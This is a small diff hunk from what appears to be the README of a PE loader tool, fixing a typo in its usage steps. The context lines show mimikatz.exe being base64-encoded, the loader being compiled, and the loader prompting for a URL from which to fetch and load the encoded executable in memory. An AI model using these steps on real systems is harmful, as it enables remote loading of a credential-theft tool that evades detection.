@@ -11,7 +11,7 @@ base64 -w 0 mimikatz.exe
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:peloader.exe peloader.cs
 ```
-4. Launch the tool, enter the url and press enter 2 : times
+4. Launch the tool, enter the url and press enter 2 times
 ```
 C:\Temp\PELoadercs>peloader.exe
 [*] Enter URL to the base64 PE file :
